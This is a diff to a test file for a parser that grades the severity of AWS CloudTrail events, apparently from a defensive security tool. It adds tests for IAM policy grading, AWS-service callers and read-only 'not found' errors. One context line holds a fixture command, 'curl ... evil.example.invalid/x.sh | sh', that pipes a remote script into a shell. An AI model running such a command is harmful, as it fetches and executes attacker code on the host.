@@ -373,7 +373,7 @@ describe("parseCloudTrail — IAM changes (#931 item 6)", () => {
       ...over,
     });
 
-  it("a Put with an Allow *:* document is High, reads the document's words, names the object, and carries the caveats", () => {
+  it("a Put with an Allow *:* document is Critical (#2542), reads the document's words, names the object, and carries the caveats", () => {
     const r = parseCloudTrail(
       envelope(
         iam("PutRolePolicy", {
@@ -384,7 +384,7 @@ describe("parseCloudTrail — IAM changes (#931 item 6)", () => {
       ),
     );
     const e = r.events[0];
-    expect(e.severity).toBe("High");
+    expect(e.severity).toBe("Critical");
     expect(e.description).toContain("replaces inline policy role=deploy policyName=inline-admin");
     expect(e.description).toContain("all actions on all resources");
     expect(e.description).toContain("previous document not in this record");
@@ -1158,5 +1158,75 @@ describe("parseCloudTrail — identities and credentials (#931 item 5)", () => {
     expect(ssm).toContain("[AWS-RunShellScript@3] cmd-1111 Pending: requested → i-0abc123def456789a");
     expect(ssm).toContain('cmd: "curl http://evil.example.invalid/x.sh | sh"');
     expect(ssm).toMatch(/AssumedRole key ASIAEXAMPLEKEY000001/);
+  });
+});
+
+describe("parseCloudTrail — AWS-service callers and read-only 'not found' answers (#2542)", () => {
+  const service = (eventName: string, over: object = {}) =>
+    record({
+      eventSource: "s3.amazonaws.com",
+      eventName,
+      userIdentity: { type: "AWSService", invokedBy: "delivery.logs.amazonaws.com" },
+      sourceIPAddress: "delivery.logs.amazonaws.com",
+      userAgent: "delivery.logs.amazonaws.com",
+      requestParameters: { bucketName: "example-log", key: `k-${eventName}` },
+      ...over,
+    });
+  const grade = (rec: object): string => parseCloudTrail(envelope(rec)).events[0].severity;
+
+  it("leaves AWS log delivery at Info, failed or not", () => {
+    expect(grade(service("PutObject", { readOnly: false, errorCode: "AccessDenied" }))).toBe("Info");
+    expect(grade(service("HeadBucket", { readOnly: true, errorCode: "AccessDenied" }))).toBe("Info");
+    expect(grade(service("PutObject", { readOnly: false }))).toBe("Info");
+    expect(grade(service("PutObject", { readOnly: false, errorCode: "InternalError" }))).toBe("Info");
+  });
+  it("still applies the importer's own table to an AWS service's call", () => {
+    const sts = { eventSource: "sts.amazonaws.com", requestParameters: {} };
+    expect(grade(service("GetFederationToken", sts))).toBe("Low");
+    const bucketPolicy = { readOnly: false, requestParameters: { bucketName: "b", bucketPolicy: {} } };
+    expect(grade(service("PutBucketPolicy", bucketPolicy))).toBe("High");
+  });
+  it("still grades an IAM user's call that an AWS service made on its behalf", () => {
+    const onBehalf = record({
+      eventSource: "s3.amazonaws.com",
+      eventName: "PutObject",
+      readOnly: false,
+      errorCode: "AccessDenied",
+      userIdentity: { type: "IAMUser", userName: "bob", accountId: "123", invokedBy: "athena.amazonaws.com" },
+    });
+    expect(grade(onBehalf)).toBe("Medium");
+  });
+  it("keeps an IAM user's denied read Medium", () => {
+    expect(
+      grade(record({ eventSource: "s3.amazonaws.com", eventName: "ListBuckets", errorCode: "AccessDenied" })),
+    ).toBe("Medium");
+  });
+  it("does not raise a read-only 'not found / not configured' answer", () => {
+    for (const [eventSource, eventName, errorCode] of [
+      ["s3.amazonaws.com", "GetBucketPolicy", "NoSuchBucketPolicy"],
+      ["s3.amazonaws.com", "GetBucketObjectLockConfiguration", "ObjectLockConfigurationNotFoundError"],
+      ["monitoring.amazonaws.com", "GetDashboard", "DashboardNotFoundError"],
+      ["cloudtrail.amazonaws.com", "GetInsightSelectors", "InsightNotEnabledException"],
+      // The same rule covers a read that names something absent; pinned so the scope is explicit.
+      ["iam.amazonaws.com", "GetUser", "NoSuchEntity"],
+      ["s3.amazonaws.com", "GetBucketAcl", "NoSuchBucket"],
+    ])
+      expect(grade(record({ eventSource, eventName, errorCode })), eventName).toBe("Info");
+  });
+  it("still raises a failed mutating call whatever its code, and keeps the root write rule", () => {
+    const write = { eventSource: "s3.amazonaws.com", eventName: "DeleteBucketPolicy", readOnly: false };
+    expect(grade(record({ ...write, errorCode: "NoSuchBucketPolicy" }))).toBe("Medium");
+    const root = { type: "Root", arn: "arn:aws:iam::123:root", accountId: "123" };
+    expect(
+      grade(
+        record({
+          eventSource: "s3.amazonaws.com",
+          eventName: "GetBucketPolicy",
+          errorCode: "NoSuchBucketPolicy",
+          userIdentity: root,
+        }),
+      ),
+    ).toBe("Info");
+    expect(grade(record({ ...write, userIdentity: root }))).toBe("Medium");
   });
 });
